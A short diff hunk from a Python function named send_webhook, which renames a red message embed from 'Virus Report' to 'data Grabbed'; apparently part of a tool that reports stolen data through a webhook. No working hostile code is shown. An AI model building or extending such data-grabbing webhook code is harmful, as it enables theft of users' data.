@@ -82,7 +82,7 @@ def send_webhook(payload_dict):
         return
 
     embed = {
-        "title": "Virus Report",
+        "title": "data Grabbed",
         "color": 0xff0000,
         "fields": []
     }
